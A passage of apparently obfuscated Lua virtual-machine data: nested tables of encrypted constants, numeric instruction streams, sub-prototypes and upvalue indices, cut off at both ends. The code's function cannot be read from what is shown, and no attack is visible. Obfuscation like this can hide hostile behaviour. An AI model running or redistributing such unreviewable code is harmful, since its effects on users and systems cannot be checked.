6,142,4,45,203,69,243,22,188,205,91,237,85,173,14,144,226,50,201,105,174,79,217,233,113,214,79,180,4,157,240,72,151,63,180,20,62,226,70,207,59,144,28,102,252,6,173,36,201,47,126,197,65,143,61,197,117,126,214,22,134,59,130,247,118,205,88,159,22,130,179,95,192,44,187,13,152,250,9,210,50,180,14,116,250,73,215,100,178,1,98,180,70,202,120,238,27,101,254,81,175,118,153,14,106,159,23,184,41,135,239,96,133,48,164,6,211,235,109,145,2,151,11,141,230,48,252,33,164,25,156,247,70,226,48,172,10,44,216,77,200,61,128,19,98,205,76,178,61,143,23,107,191,70,173,61,133,94,97,214,82,247,127,135,226,100,199,30,197,7,153,251,126,199,39,244,10,142,176,29,246,40,172,1,209,223,64,203,56,191,22,97,195,83,205,53,205,59,108,239,92,163,50,141,62,124,211,91,181,122,153,232,118,200,25,188,45,151,184,58,206,76,163,11,133,168,61,213,45,178,99,136,238,81,222,102,168,30,96,227,73,146,61,204,81,41,245,67,216,112,201,3,126,247,85,249,34,131,25,60,205,87,164,57,210,238,101,134,117,175,12,145,171,106,223,37,238,22,139,233,51,223,54,191,86,138,254,87,195,56,180,30,100,190,68,207,40,203,89,105,255,67,168,58,172,31,116,157,120,131,0,145,86,24,192,86,175,119,251,240,118,217,86,254,16,134,232,107,193,106,179,29,149,237,85,221,40,180,69,41,179,81,209,37,179,23,37,236,74,205,58,202,0,107,244,68,235,103,199,73,38,130,81,167,123,158,169,54,136,72,168,7,154,245,109,201,77,240,73,131,254,119,213,121,162,3,153,188,77,215,36,185,82,110,229,6,245,47,140,17,43,234,65,161,48,131,48,104,162,70,170,43,159,12,120,202,80,226,58,145,238,115,135,108,163,3,150,237,82,202,104,248,13,149,239,105,215,123,190,13,146,247,11,242,36,188,56,96,234,3,157,53,141,18,41,249,65,166,124,226,15,111,210,95,233,41,157,225,100,200,17,170,42,156,230,108,194,81,191,76,222,170,106,216,42,186,12,220,251,67,198,35,245,25,96,253,83,146,124,206,70,47,185,72,208,88,137,23,104,255,93,228,56,129,81,98,198,69,244,44,140,227,121,196,19,188,77,143,210,104,193,125,129,35,181,205,70,156,107,250,68,142,254,72,219,101,255,94,45,227,64,216,99,175,16,124,243,65,165,105,197,61,72,244,17,187,112,230,22,116,133,87,160,126,144,234,115,138,79,181,16,214,232,114,203,98,167,13,136,160,99,219,35,163,77,116,251,67,215,70,179,29,102,249,71,158,62,143,69,38,249,13,179,53,136,16,99,138,93,187,117,164,210,91,233,126,168,3,156,226,124,128,87,161,73,138,238,109,159,6,184,14,132,185,41,223,47,252,0,105,167,8,218,32,133,84,99,186,76,174,55,198,13,117,239,87,237,60,197,29,126,192,82,227,96,205,161,101,221,78,166,12,146,170,59,207,47,176,71,217,233,14,208,41,189,9,193,162,5,204,35,187,31,14,251,69,222,49,143,86,111,242,18,174,58,137,31,125,213,70,174,52,138,168,119,136,90,163,59,151,172,56,194,88,241,2,153,170,105,216,38,184,73,136,238,81,222,102,168,30,96,227,73,146,61,131,18,106,245,0,217,60,204,88,110,240,85,206,50,132,25,26,198,88,173,86,138,236,113,136,94,160,5,221,141,106,133,98,252,20,156,235,118,193,49,189,25,220,189,95,194,35,185,77,118,255,77,144,33,131,24,109,166,66,177,122,169,27,96,197,31,182,53,141,28,119,236,92,246,42,158,247,99,216,84,190,4,222,238,125,194,39,251,56,151,239,66,209,14,190,68,44,249,73,219,5,187,79,98,249,70,219,127,174,24,104,212,84,190,127,227},{13,198,45,181,10},{87,215,59,187,10,118,192,65,223},{71,216,46,184},{68,220,38,183,31,79,242,83},{82,216,63,180},{67,223,33,129,10},0.3,{121,233,3,174,85,91,222,96,149},{68,220,61,134},{20}},C={116,54,116,54,14,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,12,52,12,53,116,50,61,30,55,38,54,12,52,12,53,116,51,61,30,55,38,55,56,54,38,52,12,48,116,49,61,116,62,56,55,56,52,30,53,38,53,56,53,116,63,1,16,116,60,18,52,26,16,116,61,18,53,26,16,116,58,56,52,26,30,52,45,55,12,59,116,56,61,116,57,40,55,30,52,45,55,56,50,116,38,56,51,18,52,61,16,41,75,45,55,56,51,18,52,61,116,39,61,16,19,41,179,45,55,116,36,30,52,45,55,10,54},P={{K={{54,223,90,188,1},{110,204,50,180,3,141,217,118,214},{120,193,37,177},{111,219,48,188,6,156},{123,223,49,187,8,136},{114,222,39,182,6,221,228,80,139,46,189,2,103,175,111,222,58,178,17,117,236,68,163,54,206,91,88,250,94,160,40,132,12,101,247,82,184,43,153,224,115,139,21,239,14,154,235,122,194,97,184,23,199,234,65,222,35,227,43,154,230,118,221,57,168,24,103,242,2,159,0,143,23,112,249,93,177,119,193,85,66,206,87,166,54,189,236,114,223,92,190,85,155,227,56,216,71,191,68,150,228,121,144,48,175,7,210,251,82,193,104,175,6,100,250,7,202,46,129,31,106,177,95,198,60,203,12,123,234,29,225,36,198,95,53,208,20,224,124,157,231,97,221,73,160,65,145,233,126,167,41,181,70,141,233,115,215,53,183,25,138,177,80,223,47,179,80,115,245,72,208,35,202,1,109,247,75,177,59,149,14,33,133,64,239,121,158,26,102,208,74,165,126,148,234,115,160,84,182,67,142,236,114,192,98,180,6,159,174,89,209,41,181,67,116,246,74,220,60,176,0,113,184,95,214,52,138,87,122,254,81,175,58,193,4,106,204,90,230,47,139,237,113,215,85,191,20,223,163,106,133,31,160,0,140,254,108,223,100,178,4,153,154,83,213,40,176,3,42,243,93,213,45,149,29,104,244,5,233,115,146,10,54,203,87,169,61,155,17,99,208,99,165,13,156,226,117,204,117,161,17,129,233,117,205,36,252,66,137,161,2,150,53,251,64,147,226,12,152,46,176,21,45,157},{126,214,40,177,5,181,244,93}},C={56,54,116,54,1,16,116,55,56,55,26,16,116,52,12,53,116,50,61,116,51,56,52,56,53,56,52,56,52,56,52,56,53,30,49,26,16,116,48,56,50,26,30,52,45,55,10,54},P={},U={{0,3},{1,2},{1,0},{1,1},{0,2}},nParams=0}},U={{1,100},{1,9},{1,10},{1,13},{1,23},{1,101}},nParams=0},{K={15,225,{111,207,50,191},{107,206,43,161}},C={116,54,116,54,117,116,55,39,16,41,32,45,55,12,52,116,53,61,56,54,30,55,41,22,56,55,30,54,45,55,20,54,10,54},P={},U={{1,11},{1,103}},nParams=0},{K={{77,201,71,166}},C={56,54,116,54,56,55,26,10,54},P={},U={{1,107},{1,119}},nParams=0},{K={100,7,2,0,{122,195,54,180},{66},{67,238},{2},{125,150},{13,198,45,181,10},{87,215,59,187,10,118,192,65,223},{71,216,46,184},{86,204,57,183,31,99},{64,214,62,178,19,113},{75,213,46,129,31,38,246,71,147,49,141,69,123,253,80,168,59,194,27,101,205,85,189,53,128,236,61,129,27,188,4,128,242,104,195,96,180,7,148,233,37,245,32,172,56,155,227,82,222,41,184,88,33,194,76,196,59,161,29,105,239,125,164,38,145,19,110,197,17,239,99,187,30,123,209,126,164,44,178,236,126,198,89,248,65,162,236,100,219,1,189,9,149,224,68,216,52,248,65,53,186,28,238,45,182,6,67,247,89,253,57,141,27,110,181,18,145,20,177,59,106,204,80,186,58,130,163,56,146,19,237,5,157,226,48,166,86,180,69,151,224,62,208,42,179,74,158,248,3,194,33,185,1,34,229,75,218,34,141,92,97,239,67,163,39,143,22,98,183,27,229,59,131,68,66,193,89,174,28,131,250,120,202,20,237,71,134,170,50,142,36,186,3,211,173,69,221,34,211},{73,223,35,136,26,76,255,84},{106,244,14,182,85,91,222,96,149},{126,216,40,151},{}},C={116,54,116,55,21,116,52,39,16,41,37,45,55,18,55,8,116,53,39,41,47,10,54,20,47,18,55,16,116,50,61,53,116,51,116,48,30,53,16,116,50,61,53,116,49,116,62,30,53,38,52,56,54,116,63,1,16,116,60,18,54,26,16,116,61,12,58,116,59,61,116,56,18,52,30,52,26,16,116,57,56,55,26,30,52,45,55,56,52,116,38,116,49,18,55,116,49,60,60,30,52,45,55,56,53,116,39,116,36,26,10,54},P={},U={{1,13},{1,10},{1,23},{1,123}},nParams=2},{K={12,144,{85,225,97,128,38,168,202,101,231},{},{73,213,59,162},3,2,9,0,{13,198,45,181,10},{87,215,59,187,10,118,192,65,223},{71,216,46,184},{68,220,38,183,31,79,242,83},{99,225,9,156,39,81,221,111},{197,60,223,192},{70,218,35,132},{22}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,22,56,55,116,52,116,53,30,52,45,55,10,54,20,22,56,52,116,50,61,38,54,116,51,116,48,3,116,49,39,16,41,12,45,55,18,54,8,116,62,39,41,118,10,54,20,118,56,53,116,63,1,16,116,60,56,54,26,16,116,61,18,54,26,16,116,58,56,50,26,30,52,45,55,56,55,116,59,116,56,56,51,56,54,61,16,41,69,45,55,56,51,56,54,61,116,57,61,16,19,41,77,45,55,116,38,60,30,52,45,55,10,54},P={},U={{1,100},{1,23},{1,107},{1,13},{1,10},{1,101}},nParams=0},{K={7,49,{85,225,97,128,38,168,202,101,231},{},{73,213,59,162}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,22,56,55,116,52,116,53,30,52,45,55,10,54,20,22,56,52,56,54,56,53,116,50,61,30,52,45,55,10,54},P={},U={{1,100},{1,23},{1,125},{1,123}},nParams=0},{K={1,2,{79,203,57,160}},C={116,54,116,54,14,116,55,39,16,41,32,45,55,18,54,16,41,32,45,55,56,54,41,17,56,55,56,54,56,52,116,52,61,30,52,45,55,20,17,10,54},P={},U={{1,100},{1,125},{1,123}},nParams=1},{K={9,{95,195,53,190},{93,193,47,160},{91,192,54,189,9,150,204,78,216,35},{78,217,57,179},{75,245,45,186,88},{113,215,50},1,2,0,14,{116,216,57,180,4,106,249,71}},C={56,54,18,54,18,55,116,54,56,55,12,55,116,52,61,116,53,61,30,51,38,53,18,53,116,50,49,12,51,116,48,61,116,49,56,52,43,116,62,117,116,63,56,53,116,60,50,55,-1,63,55,26,18,53,116,61,12,51,116,48,61,116,63,56,52,116,63,18,52,30,50,26,10,54},P={},U={{1,39},{1,33},{1,60},{1,22}},nParams=3},{K={10,{73,196,58,182},{78,234,40,185,85},{114,202,53},0,200,{79,221,54,177,31,151,254,74}},C={56,54,56,55,18,54,18,55,116,54,30,50,38,51,18,51,116,55,12,52,116,53,61,116,50,18,50,16,19,41,17,45,55,56,52,116,51,30,55,116,50,56,53,30,50,26,18,51,116,48,12,52,116,53,61,116,50,18,52,116,50,18,53,30,50,26,18,51,10,55},P={},U={{1,40},{1,126},{1,22},{1,61}},nParams=5},{K={{77,201,71,166},15,225,0,{50,211,47,191,12,146,251,81,138,41,191,3,104,250,108,223,52,221},100,7,2,{81,215,38,182,1},{104,230,7,149,42,100,247,72,222,40},12,144,{66,203,62,188},{122},{123,230},{10},{117,158},{89,201,34,138,24,110},{77,209,35,137,22,126},{75,222,63,128,66,76,251,69,151,50,152,11,121,192,83,225,126,188,246,116,218,79,171,19,179,242,115,143,105,233,53,156,248,92,221,55,189,67,220,194,65,217,46,147,31,119,255,79,213,44,131,1,97,244,64,227,120,156,46,100,212,95,163,100,206,62,86,232,113,133,124,221,208,114,210,73,237,65,211,250,62,131,6,160,26,154,250,72,219,41,231,91,125,186},{68,176,50,143,11,127},{1,178,49,137,30},{91,163,39,143,30,122,244,93,163},{69,170,50},{82,171,51,143},{83,161,53,130,16,90,193,78},{113,148,22,173,59,81,228,107,159},{214,65,200,205},{21,171,55,135,228,122,211,73},{}},C={56,54,116,54,61,38,54,116,55,116,55,117,116,52,39,16,41,44,45,55,18,54,8,116,53,39,41,22,10,54,20,22,56,55,116,50,56,52,60,30,55,38,55,116,51,116,48,21,116,49,39,16,41,13,45,55,18,55,19,41,119,10,54,20,119,12,62,56,53,116,63,61,56,53,18,55,50,53,52,38,53,38,52,116,60,116,60,117,116,61,39,16,41,85,45,55,18,52,19,41,95,10,54,20,95,18,54,16,116,58,61,53,116,59,116,56,30,53,16,116,58,61,53,116,57,116,38,30,53,38,50,12,39,116,36,61,116,37,18,50,30,52,38,51,12,34,18,53,50,55,53,38,62,38,49,38,48,118,48,49,62,22,63,22,60,18,48,18,49,18,62,50,52,52,38,60,38,63,18,63,38,62,18,63,11,31,41,234,56,50,116,35,1,16,116,32,18,60,116,33,61,26,16,116,46,18,51,26,16,116,47,56,52,26,30,52,45,55,20,151,56,51,116,44,116,45,18,53,8,116,42,60,60,30,52,45,55,56,54,116,54,116,43,26,10,54},P={},U={{1,130},{1,14},{1,10},{1,1},{1,13},{1,23}},nParams=0},{K={{77,201,71,166},{105,217,50,186,8,158},{125,193,51,185,6,142},{76,195,35,182,13,219,171,82,148,103,144,2,98,179,3,202,174,95,212,15,200,71,223,40,129,5,121,189,21,167,121,204,24,47,130,101,161,53,137,161,49,195,87,190},{105,223,48,162,27,149,225,69},{121,208,41,178},{79,222,36,187,14,183,245},{83,198,36},{107,219,37,147,9},1,20,{99,210,62,141,28,98,239,76,206,60},{104,217,51,142,29,101,238,79,207,35},{75,216,56,183},{65,214,34,143,1},{111,222,58,175,17,115,237,66,178,56,182,16,98,248},1000},C={56,54,116,54,49,12,55,116,52,61,116,53,12,50,12,51,116,48,61,30,55,12,55,116,49,61,12,51,116,62,61,116,63,116,60,30,53,56,55,16,116,61,61,53,30,55,8,56,55,116,58,61,12,59,116,56,61,56,52,16,116,57,61,53,30,55,116,38,117,50,55,-1,63,55,26,10,54},P={},U={{1,133},{1,0},{1,7}},nParams=0},{K={{54,207,83,187,0,150,255,109,142,37,179,7,148,254,104,211,48,225},3,2,9,{109,211,34,186,5},{84,226,11,153,46,152,243,76,210,44},7,49,0,{75,197,41,178,28,114},1,{81,222,46},{81,215,56,170,3,109,249,77},{115,202,41,173,59,97},{8,201,40,142,23},{92,218,60,134,17,115,207,68,164},{74,211,43,135},{77,220,61,134,76,78,249,91,145,48,154,13,103,194,81,239,120,189,236,114,223,92,190,44,208,172,54,231,81,178,5,155,218,113,209,58,179,27,198,196,75,214,35,243,76,35,189},{74,218,60,141,25,65,248,73},{97,254,1,182,88,64,215,114,143},{13,163,63,143,28,98,235,65}},C={56,54,116,54,56,55,60,30,55,38,54,116,55,116,52,3,116,53,39,16,41,45,45,55,18,54,19,41,23,10,54,20,23,12,50,56,52,116,51,61,56,52,18,54,50,53,52,38,52,38,55,116,48,116,48,117,116,49,39,16,41,117,45,55,18,55,19,41,127,10,54,20,127,116,62,38,53,12,63,18,52,50,55,53,38,48,38,51,38,50,118,50,51,48,22,49,22,62,18,50,18,51,18,48,50,52,52,38,62,38,49,18,49,38,48,18,49,11,31,41,246,116,60,116,60,14,116,52,39,16,41,163,45,55,18,62,116,61,61,12,58,56,53,116,59,61,30,55,31,41,136,56,50,116,56,1,16,116,57,18,62,116,61,61,26,16,116,38,116,39,26,16,116,36,56,55,26,30,52,45,55,18,53,116,60,14,38,53,20,136,20,104,56,51,116,37,18,53,116,34,60,30,52,45,55,10,54},P={},U={{1,14},{1,10},{1,1},{1,7},{1,13},{1,23}},nParams=0},{K={{54,207,83,187,0,150,255,109,142,37,179,7,148,254,104,211,48,225},15,225,{108,204,35,185,4},{87,227,12,152,45,153,236,77,209,45},100,7,2,0,{75,197,41,178,28,114},12,144,{80,209,47},{82,214,63,171,0,108,246,76},{114,201,40,146,58,98},{7,200,43,143,16},{93,221,61,133,16,124,206,71,165},{73,210,52,134},{92,214,56,136,18,42,233,66,182,51,201,24,96,130,89,167,56,143,237,52,211,7,182,29,211,224,118,222,31,187,88,201,167,47,212,115,247,14,146,176,87,237,32,129,82,121,232,8,222,32,133,84,98,244,73},{77,219,63,140,22,64,251,72},1,{99,128,7,180,90,78,242,114,149,17},{15,161,57,129,30,96,213,71}},C={56,54,116,54,56,55,60,30,55,38,54,116,55,116,55,117,116,52,39,16,41,45,45,55,18,54,19,41,23,10,54,20,23,12,53,56,52,116,50,61,56,52,18,54,50,53,52,38,52,38,55,116,51,116,48,21,116,49,39,16,41,117,45,55,18,55,19,41,127,10,54,20,127,116,62,38,53,12,63,18,52,50,55,53,38,48,38,51,38,50,118,50,51,48,22,49,22,62,18,50,18,51,18,48,50,52,52,38,62,38,49,18,49,38,48,18,49,11,31,41,246,116,60,116,60,117,116,61,39,16,41,163,45,55,18,62,116,58,61,12,59,56,53,116,56,61,30,55,31,41,136,56,50,116,57,1,16,116,38,18,62,116,58,61,26,16,116,39,116,36,26,16,116,37,56,55,26,30,52,45,55,18,53,116,34,14,38,53,20,136,20,104,56,51,116,35,18,53,116,32,60,30,52,45,55,10,54},P={},U={{1,14},{1,10},{1,1},{1,7},{1,13},{1,23}},nParams=0},{K={{54,207,83,187,0,150,255,109,142,37,179,7,148,254,104,211,48,225},3,2,9,{109,211,34,186,5},{84,226,11,153,46,152,243,76,210,44},7,49,{72,196,38,179,31,115},{13,198,45,181,10},{87,215,59,187,10,118,192,65,223},{81,222,46},{70,215,47,187},{121,230,7,150,62,73,204,99,236,20,165,51,89,194,111},{70,222,32,137,29,77,252,85},{99,242,2,173,84,83,210,127,133,18,162,42},{104,240,3}},C={56,54,116,54,56,55,60,30,55,38,54,116,55,116,52,3,116,53,39,16,41,45,45,55,18,54,19,41,23,10,54,20,23,12,50,56,52,116,51,61,56,52,18,54,50,53,52,38,52,38,55,116,48,116,48,117,116,49,39,16,41,117,45,55,18,55,19,41,127,10,54,20,127,12,62,18,52,50,55,53,38,51,38,50,38,53,118,53,50,51,22,48,22,49,18,53,18,50,18,51,50,52,52,38,49,38,48,18,48,38,51,18,48,11,31,41,163,56,53,116,63,1,16,116,60,18,49,116,61,61,26,16,116,58,116,59,26,16,116,56,56,55,26,30,52,45,55,20,108,56,50,116,57,116,38,30,52,45,55,10,54},P={},U={{1,14},{1,10},{1,1},{1,13},{1,23}},nParams=0},{K={{90,196,94,160,4,155,255,123,195},{92,196,46,183,32,144,254,108,198,6,176,2,146,245,107,209,9,177,17,112,229},{83,219,44,181,9,149,228,68},1,2,{73,208,40,188,57,141,245,70,210},64,16,{99,213,36,177,10,114,252,83,215,40,156,29,105,247,89,141},{118,208,48,175},{112,230,12,153,43,34,218,102},{119,231,15,152,52}},C={56,54,116,54,61,16,41,46,45,55,56,54,116,54,61,16,116,55,61,53,116,52,30,52,38,54,116,53,116,53,14,116,50,39,16,41,28,45,55,18,54,19,41,6,10,54,20,6,56,55,19,6,55,18,54,116,51,56,55,16,41,116,45,55,116,48,16,19,41,124,45,55,116,49,26,56,52,116,62,56,55,16,41,110,45,55,56,53,16,19,41,86,45,55,56,50,26,56,52,116,63,56,55,16,41,88,45,55,116,60,16,19,41,64,45,55,116,61,26,10,54},P={},U={{1,7},{1,144},{1,140},{1,31},{1,27}},nParams=0},{K={15,225,{72,218,36,164,23,159,233},{95,192,44,187,13,152,250},{95,209,32,189,14,142,224,87,219,44,152,1,109,251,85,137},{74,212,60,163},{81,253,6,148,34,174,177,107,249},3,2,9,{103,223,58,191,0,108,251,77,216,58},{106,248,9,145,57,83}},C={56,54,19,6,54,116,54,116,54,117,116,55,39,16,41,34,45,55,56,54,41,1,56,55,116,52,61,16,116,53,61,53,40,55,50,52,55,6,53,56,50,116,50,56,51,26,56,50,116,51,116,48,26,20,80,116,49,116,62,3,116,63,39,16,41,112,45,55,56,53,41,110,56,53,16,116,60,61,53,30,55,45,55,11,6,53,20,110,56,50,116,50,56,48,26,56,50,116,51,116,61,26,10,54},P={{K={{90,196,94,160,4,155,255,123,195},100,7,2,{109,209,42,164,26},{89,212,48,147,15,142,243,70,216,45,189,1,118,230},12,144,{104,199,6},{96,212,59,190,62,96,230,83},{96,215,39,159,0,110,249,65,223,43}},C={56,54,116,54,61,38,54,116,55,116,52,21,116,53,39,16,41,32,45,55,18,54,41,68,49,12,50,18,54,16,116,51,61,53,50,55,-1,63,53,38,53,38,52,38,55,118,55,52,53,22,50,22,51,18,55,18,52,18,53,50,52,52,38,51,38,50,18,50,38,53,18,50,11,31,41,70,116,48,116,48,117,116,49,39,16,41,82,45,55,18,51,16,116,62,61,53,116,63,30,52,41,88,18,51,116,60,44,26,20,88,20,7,20,68,10,54},P={},U={{0,2}},nParams=0}},U={{1,145},{1,4},{1,7},{1,146},{1,141},{1,31},{1,27}},nParams=0},{K={{83,217,82,162,55,157,250,107,212,55,163},{89,194,46,189,3,154,248},{89,207,34,191,0,136,226,85,221,34,154,3,147,253,87,139},{72,202,58,161},{84,254,5,246,35,169,194,114,149,7,149}},C={56,54,116,54,61,16,116,55,61,53,40,55,30,52,45,55,56,52,116,52,56,53,26,56,52,116,53,116,50,26,10,54},P={{K={{90,196,94,160,4,155,255,123,195},{92,196,46,183,32,144,254,108,198,6,176,2,146,245,107,209,9,177,17,112,229},{83,219,44,181,9,149,228,68},7,49,{93,217,37,185,13,152,195,87,215,61,185},{90,220,48,181},{104,198,43,184,2,144,251,65,235,63,191,5,97,195,83,205,53},{107,193,42,170,4,110,244}},C={56,54,116,54,61,16,41,46,45,55,56,54,116,54,61,16,116,55,61,53,116,52,30,52,38,54,116,53,116,53,117,116,50,39,16,41,31,45,55,18,54,41,118,18,54,16,116,51,61,53,12,48,116,49,61,116,62,61,30,52,45,55,20,118,10,54},P={},U={{0,1}},nParams=0}},U={{1,3},{1,7},{1,142},{1,31}},nParams=0},{K={1,2,{104,203,53,183,11,147,253,66,220,39,171,8},{108,204,35,185,4},{105,223,48,162,27,149,225,69},{75,194,33,165,35,153},{74,251,1}},C={116,54,116,54,14,116,55,39,16,41,57,45,55,12,52,41,16,49,12,53,12,52,12,50,56,54,116,51,61,50,55,-1,63,55,45,55,20,16,49,56,55,116,48,12,50,56,54,116,51,61,50,55,-1,63,55,45,55,10,54},P={},U={{1,7},{1,23}},nParams=0},{K={15,225,{126,220,51,187,21},{95,192,46,186,26,200},{123,194,44,187,59,187,205},220,60,100,7,2,{84,215,59,178},200,160,30,12,144,{74,212,46,150},80,3,9,{68,174,53,137},120,140},C={116,54,116,54,117,116,55,39,16,41,36,45,55,18,54,116,52,39,41,16,12,53,116,50,61,116,51,116,48,116,48,50,53,-1,10,-1,20,158,116,49,116,62,21,116,63,39,16,41,14,45,55,18,54,116,60,39,41,122,12,53,116,50,61,116,61,116,58,116,59,50,53,-1,10,-1,20,158,116,56,116,56,117,116,57,39,16,41,104,45,55,18,54,116,38,39,41,68,12,53,116,50,61,116,39,116,58,116,51,50,53,-1,10,-1,20,158,116,36,116,63,3,116,37,39,16,41,178,45,55,18,54,116,34,39,41,174,12,53,116,50,61,116,35,116,35,116,61,50,53,-1,10,-1,20,158,12,53,116,50,61,116,32,116,61,116,32,50,53,-1,10,-1,10,54},P={},U=nil,nParams=1},{K={{112,220,94,187,23,139},7,49,{93,227,14},{123},{72,216,55,190,8,145,245},1,2,{100,230,21},{82,199,45},{70,196,59,179,29},15,225,{113,248,30,145},{80,219,63,142}},C={12,54,56,54,50,55,53,38,52,38,55,38,54,118,54,55,52,22,53,22,50,18,54,18,55,18,52,50,52,52,38,50,38,53,18,53,38,52,18,53,11,31,41,175,116,55,116,55,117,116,52,39,16,41,8,45,55,56,55,116,53,39,41,125,18,50,116,50,61,116,51,36,26,20,161,116,48,116,48,14,116,49,39,16,41,107,45,55,56,55,116,62,39,41,71,18,50,116,50,61,116,51,18,50,116,63,61,116,60,39,26,20,161,116,61,116,61,117,116,58,39,16,41,181,45,55,56,55,116,59,39,41,161,18,50,116,50,61,116,51,18,50,116,63,61,116,56,39,26,20,161,20,39,10,54},P={},U={{1,159},{1,161}},nParams=0},{K={1,14,{82,192,50,160,6,148,238,69},{114,202,53},{91,194,34,187,12},{77,216,62,178},{74,246,44,181,89},6,0,{96,212,43,176,9,115,251,82,212,41,180,1,103,247,95,207,51,151,29,101,253,72},{111,215,48,179,26,118,218,90,223,43,147},{116,214,56,184,30,119},{74,203},{66,216,56,186},{2,242,119,197,62,60,188,127},8,{108,210,58,143},{108,210,62,151},{104,209,53,129},48,{125,175,32,143,13,101,240,92},80,50,{107},{108},44,132,180,178,{98,172,36,155,214,103,221,85,173,0,128,226},{118,190,24,158,231},{76,170,60,157,225},{80,162,44,151,247,108},{92},{75,188,4},100,7,2,{126,158,41},{22,186,21,144,238,115,215},{4,134,53},{39,167,26,148,252},{20,151,59,178},{51,182,24,147},{6,185,5,136,240,87,228,35,167,21},{5,184,2,137,243,86,232,36,173,24,112,254,69,211},{17,191,14,116,252,84,139},{37,186,26,105},{36,189,23},{11,191,3,108,250,92,200,42,161,20,102,237,79,178,7,142,0,104},{18},{13,189,1,106,244,94,202,52,183,30,112,248}},C={56,54,116,54,14,6,54,56,55,116,55,30,55,38,53,12,52,116,53,61,116,50,30,55,38,50,18,50,116,51,12,48,116,53,61,116,54,56,55,116,49,30,55,43,116,62,18,53,30,50,26,18,50,116,63,116,54,26,18,50,116,60,56,54,26,18,50,116,61,56,52,26,56,53,18,50,12,58,116,59,61,116,56,30,55,116,57,56,50,12,38,116,39,61,116,36,61,30,51,38,51,18,51,116,51,12,48,116,53,61,116,62,56,55,116,37,30,55,116,54,116,62,30,50,26,18,51,116,34,12,48,116,53,61,116,62,116,62,116,62,116,62,30,50,26,56,53,18,50,18,54,116,57,56,51,12,38,116,39,61,116,36,61,30,51,38,48,18,48,116,51,12,48,116,53,61,116,62,56,55,116,35,30,55,116,54,116,62,30,50,26,18,48,116,34,12,48,116,53,61,116,62,56,55,116,32,30,55,116,62,116,62,30,50,26,56,53,18,50,116,33,18,55,116,46,60,60,116,57,56,48,18,55,30,55,12,38,116,39,61,116,36,61,30,51,38,49,18,49,116,51,12,48,116,53,61,116,62,56,55,116,47,30,55,116,54,116,62,30,50,26,18,49,116,34,12,48,116,53,61,116,62,56,55,116,44,30,55,116,62,116,62,30,50,26,56,53,18,50,18,52,116,57,56,49,12,38,116,39,61,116,36,61,30,51,38,62,18,62,116,51,12,48,116,53,61,116,54,56,55,116,45,30,55,43,116,54,116,62,30,50,26,18,62,116,34,12,48,116,53,61,116,62,56,55,116,42,30,55,116,62,116,62,30,50,26,18,62,116,43,12,38,116,43,61,116,40,61,26,12,41,116,22,61,56,62,1,16,116,23,18,50,26,16,116,20,18,55,26,30,52,45,55,116,21,116,18,21,116,19,39,16,41,403,45,55,56,63,116,16,31,41,484,18,50,116,17,56,63,116,30,39,16,41,396,45,55,18,55,116,31,39,16,19,41,505,45,55,56,63,116,28,39,16,41,505,45,55,18,55,116,29,39,26,20,484,56,52,116,26,12,48,116,53,61,116,62,116,62,116,62,56,54,18,53,56,55,116,54,30,55,14,117,56,55,116,49,30,55,14,30,50,26,56,52,116,27,49,12,24,116,53,61,116,62,12,25,116,6,61,116,62,56,52,116,7,61,116,4,61,56,52,116,5,61,116,4,61,54,50,52,-1,63,55,26,10,54},P={},U={{1,160},{1,22},{1,157},{1,39},{1,33},{1,34},{1,162},{1,35},{1,159},{1,161}},nParams=3},{K={{88,224,115},{88,204,35,184,1,139,227,106,220,33,155,4,146,254,86,132},{94,252,19},{75,238,16,155}},C={116,54,6,54,56,55,116,54,61,116,55,56,52,26,56,55,116,52,61,116,55,56,53,26,56,55,116,53,61,116,55,56,53,26,56,50,30,54,45,55,10,54},P={},U={{1,161},{1,149},{1,27},{1,26},{1,163}},nParams=0},{K={{92,254,109},{88,204,35,184,1,139,227,106,220,33,155,4,146,254,86,132},{90,226,13},{75,238,16,155}},C={116,54,6,54,56,55,116,54,61,116,55,56,52,26,56,55,116,52,61,116,55,56,53,26,56,55,116,53,61,116,55,56,53,26,56,50,30,54,45,55,10,54},P={},U={{1,161},{1,149},{1,31},{1,26},{1,163}},nParams=0},{K={{78,237,109,156},{88,204,35,184,1,139,227,106,220,33,155,4,146,254,86,132},{88,193,45,187,21,201},{122,221,45,184,58,188,204},130,80,10,{97,255,10},{100,230,21}},C={116,54,6,54,56,55,116,54,61,116,55,12,52,116,53,61,116,50,116,51,116,48,30,53,26,56,55,116,49,61,116,55,56,52,26,56,55,116,62,61,116,55,56,52,26,56,53,30,54,45,55,10,54},P={},U={{1,161},{1,149},{1,26},{1,163}},nParams=0},{K={{112,220,94,187,23,139},{124},{95,203,50,160,21,149,244},0,{94,209,45,160,8,143,220,75,207,45},{75,245,45,186,88},{113,215,50}},C={12,54,56,54,50,55,53,38,52,38,55,38,54,118,54,55,52,22,53,22,50,18,54,18,55,18,52,50,52,52,38,50,38,53,18,53,38,52,18,53,11,31,41,10,18,50,116,55,61,16,116,52,61,53,30,55,45,55,20,39,1,6,54,116,53,6,55,56,52,116,50,12,51,116,48,61,116,53,116,53,116,53,116,53,30,50,26,10,54},P={},U={{1,159},{1,160},{1,157}},nParams=0},{K={{105,222,86,188,17},12,144,{89,193,55,184},{80,213,48,165,8,155,234,118,204,56,190},{83,212,55,164,11,154,245,116,215,59,178,6,108,242},{104,211,55,182},3,2,9,{110,211,58,175,14,101,240,109,201,60,142,6},{65,197,56,178,2},7,49,{106,223,62,147,18,97,252,101,209,52,138},{65,213,40,142},{103,221,34,135},{10,149,61,134,95},{95,209,34,144,5,99,243,87}},C={116,54,38,52,116,55,116,55,117,116,52,39,16,41,42,45,55,18,55,12,53,116,50,61,116,51,61,39,41,18,116,48,38,52,20,82,116,49,116,62,3,116,63,39,16,41,10,45,55,18,55,12,53,116,50,61,116,60,61,39,41,114,116,61,38,52,20,82,116,58,116,58,117,116,59,39,16,41,106,45,55,18,55,12,53,116,50,61,116,56,61,39,41,82,116,57,38,52,20,82,49,56,54,56,55,116,38,61,116,39,60,18,52,12,36,18,54,50,55,-1,63,55,45,55,10,54},P={},U={{1,164},{1,7}},nParams=2},{K={1,2,{80,203,56,151,8,158,232},{89,193,55,184},{79,217,36,190,29,175,231,75,211,60},{72,216,55,190,8,145,245}},C={116,54,116,54,14,116,55,39,16,41,21,45,55,18,55,19,16,41,21,45,55,18,54,116,52,61,12,53,116,52,61,116,50,61,39,41,4,56,54,116,51,56,54,116,51,61,19,26,20,4,